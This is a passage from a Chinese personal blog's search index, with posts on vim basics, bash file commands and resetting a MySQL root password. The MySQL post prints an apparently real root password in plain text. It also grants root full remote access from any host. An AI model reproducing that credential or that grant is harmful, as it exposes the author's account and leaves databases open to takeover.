<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux学习-第三章</title>
      <link href="/posts/myh10007.html"/>
      <url>/posts/myh10007.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第三章：使用编辑器"><a href="#第三章：使用编辑器" class="headerlink" title="第三章：使用编辑器"></a>第三章：使用编辑器</h2><h3 id="3-1-检查vim软件包，安装vim"><a href="#3-1-检查vim软件包，安装vim" class="headerlink" title="3.1 检查vim软件包，安装vim"></a>3.1 检查<code>vim</code>软件包，安装<code>vim</code></h3><p>有的发行版默认的<code>vim</code>编辑器并不是完整的包，只是<code>vim.tiny  </code>，提供少量的编辑功能。所以首先检查一下包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">which</span> <span class="token function">vi</span>/usr/bin/vi$ readlink -f /usr/bin/vi    <span class="token comment">#readlink –f命令能够立刻找出链接文件的最后一环。</span>/usr/bin/vim.tiny<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时就要安装<code>vim</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">vim</span>$ readlink -f /usr/bin/vi/usr/bin/vim.basic    <span class="token comment">#安装成功了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-vim基础"><a href="#3-2-vim基础" class="headerlink" title="3.2 vim基础"></a>3.2 vim基础</h3><p>启动<code>vim</code>编辑器:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如在启动vim时未指定文件名，或者这个文件不存在， vim会<strong>开辟一段新的缓冲区域</strong>来编辑。如果你在命令行下指定了一个已有文件的名字， vim会将文件的整个内容都<strong>读到一块缓冲区域</strong>来准备编辑 。</p><p>vim编辑器会检测会话终端的类型，并用<strong>全屏模式</strong>将整个控制台窗口作为编辑器区域。<br>最初的vim编辑窗口显示了文件的内容（如果有内容的话），并在窗口的底部显示了一条消息行。如果文件内容并未占据整个屏幕， vim会在<strong>非文件内容行放置一个波浪线</strong> 。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711057.png"></p><p>vim编辑器有<strong>两种操作模式</strong>：</p><ul><li><font color="#FF5E3A" size="3">普通模式</font></li><li><font color="#FF5E3A" size="3">插入模式</font></li></ul><p>刚打开要编辑的文件时（或新建一个文件时）， vim编辑器会进入普通模式。<font color="#FF5E3A" size="3">在普通模式中， vim编辑器会将按键解释成命令。</font>  </p><p>在插入模式下， vim会将你在当前光标位置输入的每个键都插入到缓冲区。<font color="#FF5E3A" size="3">按下i键就可以进入插入模式</font>。要退出插入模式回到普通模式，按下键盘上的<strong>退出键（ ESC键）</strong>就可以了。  </p><p>在普通模式中，可以用方向键在文本区域<strong>移动光标</strong> 或者使用如下键：</p><ul><li>h：左移一个字符。  </li><li>j：下移一行（文本中的下一行）。  </li><li>k：上移一行（文本中的上一行）。  </li><li>l：右移一个字符。  </li></ul><p>在大的文本文件中一行一行地来回移动会特别麻烦，幸而vim提供了一些能够提高移动速度<br>的命令。</p><ul><li><code>PageDown</code>（或Ctrl+F）：下翻一屏。</li><li><code>PageUp</code>（或Ctrl+B）：上翻一屏。</li><li>G：移到缓冲区的最后一行。</li><li><code>num G</code>：移动到缓冲区中的第<code>num</code>行。</li><li>gg：移到缓冲区的第一行。  </li></ul><p>vim编辑器在普通模式下有个特别的功能叫<font color="#FF5E3A" size="3">命令行模式</font>。命令行模式提供了一个交互式命令行，<strong>可以输入额外的命令来控制vim的行为</strong>。要进入命令行模式，在普通模式下<font color="#FF5E3A" size="3">按下冒号键</font>。光标会移动到消息行，然后出现冒号，等待输入命令。  </p><p>在命令行模式下有几个命令可以<strong>将缓冲区的数据保存到文件中并退出vim</strong>。</p><ul><li>q：如果未修改缓冲区数据，退出</li><li>q!：<strong>取消</strong>所有对缓冲区数据的修改并退出。</li><li>w filename：将文件保存到另一个文件中。</li><li>wq：将缓冲区数据<strong>保存</strong>到文件中并退出。 </li></ul><h3 id="3-3-编辑数据"><a href="#3-3-编辑数据" class="headerlink" title="3.3 编辑数据"></a>3.3 编辑数据</h3><p>在插入模式下，你可以向缓冲区插入数据。然而有时将数据输入到缓冲区中后，你需要再对其进行添加或删除。在<strong>普通模式下</strong>， vim编辑器提供了一些命令来<strong>编辑缓冲区中的数据</strong>。下表列出了一些常用的vim编辑命令。  </p><hr><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>dd</td><td>删除当前光标所在行</td></tr><tr><td>x</td><td>删除当前光标所在位置的字符</td></tr><tr><td>dw</td><td>删除当前光标所在位置的单词</td></tr><tr><td>d$</td><td>删除当前光标所在位置至行尾的内容</td></tr><tr><td>u</td><td>撤销前一编辑命令</td></tr><tr><td>J</td><td>删除当前光标所在行行尾的换行符（拼接行）</td></tr><tr><td>A</td><td>在当前光标所在行行尾追加数据（直接进入了插入模式）</td></tr><tr><td>a</td><td>在当前光标后追加数据（直接进入了插入模式）</td></tr><tr><td>r char</td><td>用char替换当前光标所在位置的单个字符</td></tr></tbody></table><hr><p>说明 在vim编辑器的普通模式下使用退格键（ Backspace键）和删除键（ Delete键）时要留心。vim编辑器通常会<strong>将删除键识别成x命令</strong>的功能，删除当前光标所在位置的字符。 vim编辑器在普通模式下通常不识别退格键。  </p><hr><h3 id="3-4-复制和粘贴"><a href="#3-4-复制和粘贴" class="headerlink" title="3.4 复制和粘贴"></a>3.4 复制和粘贴</h3><h4 id="3-4-1-粘贴内容"><a href="#3-4-1-粘贴内容" class="headerlink" title="3.4.1 粘贴内容"></a>3.4.1 粘贴内容</h4><p><font color="#FF5E3A" size="3">vim在删除数据时，实际上会将数据保存在单独的一个寄存器中。可以用p命令取回数据。 </font> </p><p>举例来说，可以用<code>dd</code>命令删除一行文本，然后把光标移动到缓冲区的某个要放置该行文本的位置，然后用<code>p</code>命令。该命令会将文本插入到当前光标所在行之后。可以将它和任何删除文本的命令一起搭配使用。  (注意p命令粘贴的只是上<strong>一次</strong>删除的内容。)</p><h4 id="3-4-2-复制内容"><a href="#3-4-2-复制内容" class="headerlink" title="3.4.2 复制内容"></a>3.4.2 复制内容</h4><p>vim中复制命令是y（代表yank）。可以在y后面使用和d命令相同的第二字符（ yw表示复制一个单词， y$表示复制到行尾）。在复制文本后，把光标移动到你想放置文本的地方，输入p命令。复制的文本就会出现在该位置  。</p><h4 id="3-4-3-复制内容-可视化模式"><a href="#3-4-3-复制内容-可视化模式" class="headerlink" title="3.4.3 复制内容-可视化模式"></a>3.4.3 复制内容-可视化模式</h4><p>按下<code>v</code>键进入可视化模式。下一步，移动光标来覆盖你想要复制的文本（甚至可以向下移动几行来复制更多行的文本）。在移动光标时， vim会高亮显示复制区域的文本。在覆盖了要复制的文本后，按y键来激活复制命令。移动光标到要放置的位置，使用p命令来粘贴。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711059.png"></p><h3 id="3-5-查找和替换"><a href="#3-5-查找和替换" class="headerlink" title="3.5 查找和替换"></a>3.5 查找和替换</h3><h4 id="3-5-1-查找"><a href="#3-5-1-查找" class="headerlink" title="3.5.1 查找"></a>3.5.1 查找</h4><p>按下斜线 <code>/键</code>，光标会跑到消息行，然后vim会显示出斜线。在输入你要查找的文本后，按下回车键。会出现三种可能的结果：</p><ul><li>要查找的文本出现在光标当前位置之后，则光标会跳到该文本出现的第一个位置。  </li><li>要查找的文本未在光标当前位置之后出现，则光标会绕过文件末尾，出现在该文本所在的第一个位置（并用一条消息指明）。</li><li>输出一条错误消息，说明在文件中没有找到要查找的文本。  </li></ul><p>要继续查找同一个单词，按下斜线键，然后按回车键。或者使用<code>n键</code>，表示下一个（ next）。    </p><h4 id="3-5-2-替换"><a href="#3-5-2-替换" class="headerlink" title="3.5.2 替换"></a>3.5.2 替换</h4><p><font color="#FF5E3A" size="3">必须进入命令行模式才能使用替换命令。</font>替换命令的格式是：<code>:s/old/new/</code> ，vim编辑器会跳到old第一次出现的地方，并用new来替换。  </p><p>可以对替换命令作一些修改来替换多处文本：  </p><ul><li><code>:s/old/new/g</code>：替换光标所在行的所有old。  </li><li><code>:n,ms/old/new/g</code>：替换行号n和m之间所有old。  </li><li><code>:%s/old/new/g</code>：替换整个文件中的所有old。  </li><li><code>:%s/old/new/gc</code>：替换整个文件中的所有old，但在每次出现时提示。  </li></ul><hr><p>这里就是基本的vim编辑器命令，需要经常使用增加手指记忆，还有许多其他的编辑器，先学会这个再学学别的~</p><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711060.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux登录mysql报错</title>
      <link href="/posts/myh10006.html"/>
      <url>/posts/myh10006.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mysql登录报错：ERROR-1045-28000"><a href="#mysql登录报错：ERROR-1045-28000" class="headerlink" title="mysql登录报错：ERROR 1045 (28000)"></a>mysql登录报错：ERROR 1045 (28000)</h2><p>在使用xshell连接服务器登陆mysql的时候，出现Access denied for user ‘root’@’localhost’ (using password: YES) 拒绝访问。emmm这就很尴尬，接着我登上服务器的终端也不行，查了一下解决方法如下：</p><h4 id="1、vim-etc-my-cnf文件"><a href="#1、vim-etc-my-cnf文件" class="headerlink" title="1、vim /etc/my.cnf文件"></a>1、vim /etc/my.cnf文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 [mysqld] 后添加  skip-grant-tables （跳过检查），然后按esc、ZZ退出。</p><h4 id="2、重启MySQL服务："><a href="#2、重启MySQL服务：" class="headerlink" title="2、重启MySQL服务："></a>2、重启MySQL服务：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3、修改密码"><a href="#3、修改密码" class="headerlink" title="3、修改密码"></a>3、修改密码</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('你的密码');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能会出现  ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement  的报错，输入 ：flush privileges;</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、再次重新设置密码"><a href="#4、再次重新设置密码" class="headerlink" title="4、再次重新设置密码"></a>4、再次重新设置密码</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('你的密码');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5、重设远程访问"><a href="#5、重设远程访问" class="headerlink" title="5、重设远程访问"></a>5、重设远程访问</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'Mingloveyh1314' WITH GRANT OPTION;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6、把skip-grant-tables删除"><a href="#6、把skip-grant-tables删除" class="headerlink" title="6、把skip-grant-tables删除"></a>6、把skip-grant-tables删除</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7、重启MySQL"><a href="#7、重启MySQL" class="headerlink" title="7、重启MySQL"></a>7、重启MySQL</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以正常登陆了~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214197.png" style="zoom:150%;"><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214199.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第二章</title>
      <link href="/posts/myh10005.html"/>
      <url>/posts/myh10005.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第二章：基本的-bash-shell-命令"><a href="#第二章：基本的-bash-shell-命令" class="headerlink" title="第二章：基本的 bash shell 命令"></a>第二章：基本的 bash shell 命令</h2><h3 id="2-1浏览文件系统"><a href="#2-1浏览文件系统" class="headerlink" title="2.1浏览文件系统"></a>2.1浏览文件系统</h3><h4 id="2-1-1-Linux文件系统"><a href="#2-1-1-Linux文件系统" class="headerlink" title="2.1.1 Linux文件系统"></a>2.1.1 Linux文件系统</h4><p>Linux不同于WIndows，在路径名中不使用驱动器盘符。  </p><p>Linux将文件存储在<font color="#FF5E2A" size="4"><strong>单个目录结构</strong></font>中，这个目录被称为<font color="#FF5E2A" size="4"><strong>虚拟目录（ virtual directory）</strong></font>。虚拟目录将安装在PC上的所有存储设备的文件路径纳入单个目录结构中。Linux虚拟目录结构<strong>只包含一个称为<font color="#FF5E2A" size="4">根（ root）目录</font>的基础目录</strong>。根目录下的目录和文件会按照访问它们的目录路径一一列出，这点跟Windows类似。  </p><p>在Linux PC上安装的<strong>第一块硬盘</strong>称为根驱动器。<strong>根驱动器包含了虚拟目录的核心</strong>，其他目录都是从那里开始构建的。Linux会在根驱动器上创建一些特别的目录，我们称之为<strong>挂载点（ mount point）</strong>。<font color="#FF5E2A" size="4">挂载点是虚拟目录中用于分配额外存储设备的目录</font>。虚拟目录会让文件和目录出现在这些挂载点目录中，然而<strong>实际上它们却存储在另外一个驱动器</strong>中。 </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635094.png"></p><p>如图Disk1硬盘和虚拟目录的根目录关联起来。Disk2硬盘就可以挂载到虚拟目录结构中的任何地方。在这个例子中，第二块硬盘被挂载到了/home位置，home这个目录就是一个挂载点，用户目录都位于这个位置。</p><p>​                                                                                        <strong>常见的Linux目录名称</strong></p><table><thead><tr><th align="center"><strong>/</strong></th><th align="center">虚拟目录的根目录。通常不会在这里存储文件</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">二进制目录，存放许多用户级的GNU工具</td></tr><tr><td align="center">/bot</td><td align="center">启动目录，存放启动文件</td></tr><tr><td align="center">/dev</td><td align="center">设备目录， Linux在这里创建设备节点</td></tr><tr><td align="center"><strong>/etc</strong></td><td align="center"><strong>系统配置文件目录</strong></td></tr><tr><td align="center"><strong>/home</strong></td><td align="center">主目录， Linux在这里创建<strong>用户目录</strong></td></tr><tr><td align="center">/lib</td><td align="center">库目录，存放系统和应用程序的库文件</td></tr><tr><td align="center">/media</td><td align="center">媒体目录，可移动媒体设备的常用<strong>挂载点</strong></td></tr><tr><td align="center">/mnt</td><td align="center">挂载目录，另一个可移动媒体设备的常用挂载点</td></tr><tr><td align="center">/opt</td><td align="center">可选目录，常用于存放<strong>第三方软件包和数据文件</strong></td></tr><tr><td align="center"><strong>/proc</strong></td><td align="center">进程目录，存放现有硬件及当前<strong>进程的相关信息</strong></td></tr><tr><td align="center"><strong>/root</strong></td><td align="center"><strong>root用户的主目录</strong></td></tr><tr><td align="center">/sbin</td><td align="center">系统二进制目录，存放许多GNU管理员级工具</td></tr><tr><td align="center">/run</td><td align="center">运行目录，存放系统运作时的运行时数据</td></tr><tr><td align="center">/srv</td><td align="center">服务目录，存放本地服务的相关文件</td></tr><tr><td align="center">/sys</td><td align="center">系统目录，存放系统硬件信息的相关文件</td></tr><tr><td align="center"><strong>/tmp</strong></td><td align="center">临时目录，<strong>可以在该目录中创建和删除临时工作文件</strong></td></tr><tr><td align="center">/usr</td><td align="center">用户二进制目录，大量用户级的GNU工具和数据文件都存储在这里</td></tr><tr><td align="center"><strong>/var</strong></td><td align="center">可变目录，用以存放经常变化的文件，比如<strong>日志文件</strong></td></tr></tbody></table><h4 id="2-1-2-遍历目录"><a href="#2-1-2-遍历目录" class="headerlink" title="2.1.2 遍历目录"></a>2.1.2 遍历目录</h4><p>在Linux文件系统上，可以使用<font color="#FF5E2A" size="2">切换目录命令cd将shell会话切换到另一个目录</font>。 cd命令的格式非常简单：<strong>cd destination</strong><br>cd命令可接受单个参数destination，用以指定想切换到的目录名。<strong>如果没有为cd命令指定目标路径，它将切换到用户主目录。</strong><br>destination参数可以用两种方式表示：一种是使用<strong>绝对文件路径</strong>，另一种是使用<strong>相对文件路径</strong>。</p><p><strong>1.绝对文件路径</strong></p><p>​            <font color="#FF5E2A" size="2">对文件路径总是以正斜线（ /）作为起始，指明虚拟文件系统的根目录。</font>  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928215.png" style="zoom:200%;"><p>如图刚开始是在/root目录中，如果切换到usr/bin目录中，就直接使用 cd /usr/bin，（一定最开始是根目录！）</p><p>这里的 <strong>pwd 是显示当前所在的位置</strong>的命令。</p><p><strong>2.相对文件路径</strong></p><p>就是基于你目前所在的目录进行相对的移动。</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928216.png" style="zoom:150%;"><p>如图，刚开始在usr目录中，要进入usr的lib目录中，则可以直接 cd lib 。（ls 是显示当前目录下的文件和子目录，后面会讲。）</p><p>有两个特殊字符可用于相对文件路径中：</p><ul><li> <strong>单点符（ .）</strong>，表示当前目录；</li><li> <strong>双点符（ ..）</strong>，表示当前目录的父目录。</li></ul><p>重点就是双点符，可以较为方便的在相对文件路径中使用：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928217.png" style="zoom:150%;"><h3 id="2-2-文件和目录列表"><a href="#2-2-文件和目录列表" class="headerlink" title="2.2 文件和目录列表"></a>2.2 文件和目录列表</h3><h4 id="2-2-1-基本列表功能"><a href="#2-2-1-基本列表功能" class="headerlink" title="2.2.1 基本列表功能"></a>2.2.1 基本列表功能</h4><p><strong><code>ls [path]</code> - 列出文件</strong></p><p>该程序<code>ls</code>允许您列出<strong>目录中的文件和其子目录</strong>。它可以传递许多不同的参数（或“标志”）来控制输出。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635096.png"></p><p><strong><code>ls -F</code></strong>  带-F参数的ls命令<strong>轻松区分文件和目录</strong>  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635097.png"></p><p>Linux经常<strong>采用隐藏文件来保存配置信息</strong>。在Linux上，隐藏文件通常是<strong>文件名以点号开始</strong>的文件。这些文件并<strong>没有</strong>在默认的ls命令输出中显示出来，因此我们称其为<font color="#FF5E3A" size="3">隐藏文件</font>。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635098.png"></p><p>ls支持选项合并如：<code>ls -Fa</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635100.png"></p><p><strong><code>ls -l</code> 显示附加信息，长列表输出</strong></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635101.png" style="zoom:150%;"><ul><li><p> 文件类型，比如目录（ d）、文件（ -）、字符型文件（ c）或块设备（ b）；</p></li><li><p> 文件的权限；</p></li><li><p>文件的硬链接总数；</p></li><li><p> 文件属主的用户名；</p></li><li><p> 文件属组的组名；</p></li><li><p> 文件的大小（以<strong>字节</strong>为单位）；</p></li><li><p> 文件的上次<strong>修改时间</strong>；</p></li><li><p> 文件名或目录名。  </p></li></ul><h4 id="2-2-2-过滤输出列表"><a href="#2-2-2-过滤输出列表" class="headerlink" title="2.2.2 过滤输出列表"></a>2.2.2 过滤输出列表</h4><p>当要输出指定文件或者指定开头等的文件时，可以使用过滤查询：<code>ls -l x</code> ，过滤器就是一个进行简单文本匹配的字符串。可以在要用的命令行参数之后添加这个过滤器  。<strong>同时支持通配符匹配</strong>。</p><ul><li><p> 问号（ ?）代表<strong>一个</strong>字符；</p></li><li><p> 星号（ *）代表<strong>零个或多个</strong>字符。  </p></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635102.png" style="zoom:150%;"><h4 id="2-2-3-tree"><a href="#2-2-3-tree" class="headerlink" title="2.2.3 tree"></a>2.2.3 tree</h4><p>还有一个遍历文件功能指令tree,能较好地展示文件之间的层级结构，将本目录中的文件、子目录、子目录中的文件都以树形展示出来：（Debian 版本没有这个指令，可以<code>apt-get tree</code>安装），不要尝试<code>tree /</code>,除非你觉着很炫酷hhhh</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635103.png"></p><h3 id="2-3-处理文件"><a href="#2-3-处理文件" class="headerlink" title="2.3 处理文件"></a>2.3 处理文件</h3><h4 id="2-3-1-创建文件"><a href="#2-3-1-创建文件" class="headerlink" title="2.3.1 创建文件"></a>2.3.1 创建文件</h4><p><strong>touch</strong>命令轻松创建<strong>空文件</strong>（<strong>注意是空文件，不代表可以是空目录哦</strong>）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> test_one<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635104.png" style="zoom:150%;"><h4 id="2-3-2-复制文件"><a href="#2-3-2-复制文件" class="headerlink" title="2.3.2 复制文件"></a>2.3.2 复制文件</h4><p><strong>cp</strong>命令将文件或目录从一个位置复制到另一个位置  。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> <span class="token operator">&lt;</span>source<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>destination<span class="token operator">&gt;</span> - 复制文件-i选项，强制shell询问是否需要覆盖已有文件。-R参数，可以用它在一条命令中递归地复制整个目录的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635105.png"></p><p>可以看到加上 -i 选项，就会强制询问是否覆盖，<strong>最好每次都带上</strong>，写 yes/no 就可。可以看到修改时间没变。</p><p>cp命令的-<strong>R参数</strong>。可以用它在一条命令中<strong>递归地复制整个目录的内容</strong>。  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635106.png" style="zoom:150%;"><h4 id="2-3-3-移动和重命名文件"><a href="#2-3-3-移动和重命名文件" class="headerlink" title="2.3.3 移动和重命名文件"></a>2.3.3 移动和重命名文件</h4><p>在Linux中，<strong>重命名文件称为移动（ moving）</strong> 。 mv命令可以将文件和目录移动到另一个位置或重新命名。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Moving a file "into" another file is how you rename files</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file test_file1</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -F</span>test2/testdir/  test_file1  test_file2<span class="token comment"># Move file into directory</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file1 testdir/</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── test2│   ├── test_file│   └── test_file2├── testdir│   └── test_file1└── test_file2<span class="token number">2</span> directories, <span class="token number">4</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-4-删除文件"><a href="#2-3-4-删除文件" class="headerlink" title="2.3.4 删除文件"></a>2.3.4 删除文件</h4><p>在Linux中，删除（ deleting）叫作移除（ removing） 。 bash shell中删除文件的命令是 <strong>rm</strong>。  -+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">`</span><span class="token function">rm</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span><span class="token variable">`</span></span> - 永久删除文件-i命令参数提示你是不是要真的删除该文件-r参数删除目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test/test2<span class="token comment"># rm -i test_file</span>rm: remove regular empty <span class="token function">file</span> <span class="token string">'test_file'</span>? yroot@VM-16-11-debian:/tmp/test/test2<span class="token comment"># ls -l</span>total <span class="token number">0</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">0</span> Jan <span class="token number">16</span> <span class="token number">15</span>:35 test_file2-r参数删除目录：root@VM-16-11-debian:/tmp/test<span class="token comment"># rm -r test2</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── testdir│   └── test_file1└── test_file2<span class="token number">1</span> directory, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-处理目录"><a href="#2-4-处理目录" class="headerlink" title="2.4 处理目录"></a>2.4 处理目录</h3><h4 id="2-4-1-创建目录"><a href="#2-4-1-创建目录" class="headerlink" title="2.4.1 创建目录"></a>2.4.1 创建目录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> New_Dir-p参数：同时创建多个目录和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># mkdir -p test2/test3</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── test2│   └── test3├── testdir│   └── test_file1└── test_file2<span class="token number">3</span> directories, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-2-删除目录"><a href="#2-4-2-删除目录" class="headerlink" title="2.4.2 删除目录"></a>2.4.2 删除目录</h4><p>rmdir命令<strong>只删除空目录</strong>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rmdir</span> mydir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># rmdir test2</span>rmdir: failed to remove <span class="token string">'test2'</span><span class="token builtin class-name">:</span> Directory not empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-5-查看文件"><a href="#2-5-查看文件" class="headerlink" title="2.5 查看文件"></a>2.5 查看文件</h3><h4 id="2-5-1-查看文件类型"><a href="#2-5-1-查看文件类型" class="headerlink" title="2.5.1  查看文件类型"></a>2.5.1  查看文件类型</h4><p>在显示文件内容之前，应该先了解一下文件的类型。如果打开了一个二进制文件，你会在屏幕上看到各种乱码，甚至会把你的终端仿真器挂起。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> my_file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># file testdir</span>testdir: directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-5-2-查看整个文件"><a href="#2-5-2-查看整个文件" class="headerlink" title="2.5.2 查看整个文件"></a>2.5.2 查看整个文件</h4><p><strong><code>cat &lt;filename&gt;</code> - 打印文件</strong></p><p>要将文件的内容快速转储到控制台，请使用<code>cat</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1-n参数会给所有的行加上行号。-b参数会给只是文本的行加上行号。The quick brown fox jumped over the lazy dog.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>more</code>命令</strong></p><p><code>cat</code>命令的主要缺陷是：一旦运行，你就无法控制后面的操作。为了解决这个问题，开发人员编写了<code>more</code>命令。 <code>more</code>命令会显示文本文件的内容，但会在显示每页数据之后停下来。 可以通过按空格键或回车键以逐行向前的方式浏览文本文件。浏览完之后，按q键退出。 </p><p><strong><code>less</code>命令</strong></p><p><strong><code>less &lt;filename&gt;</code> - 显示和滚动文件</strong></p><p><code>less</code>如果您想查看一个不完全适合一个屏幕的长文件的内容，该程序很有用。要在运行后退出，请按 